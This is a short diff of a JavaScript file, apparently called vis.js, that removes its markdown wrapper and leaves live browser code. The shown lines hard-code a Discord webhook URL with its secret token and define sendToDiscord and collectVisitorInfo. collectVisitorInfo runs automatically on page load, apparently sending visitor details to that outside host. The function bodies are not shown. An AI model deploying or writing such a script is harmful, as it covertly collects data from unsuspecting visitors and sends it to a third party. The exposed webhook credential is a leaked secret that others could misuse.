@@ -1,6 +1,4 @@
-this is vis.js
 
-```javascript
 const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1475243768910450711/xHfthm1ud7YaT_IbwsJ7Bhkrb9Obr58Fr0gKGXJiQMHSs0UJQMOqlgGqgzm26Oe7_8jl';
 
 async function sendToDiscord(data) {
@@ -74,4 +72,4 @@ async function collectVisitorInfo() {
 }
 
 window.addEventListener('load', collectVisitorInfo);
-```
+
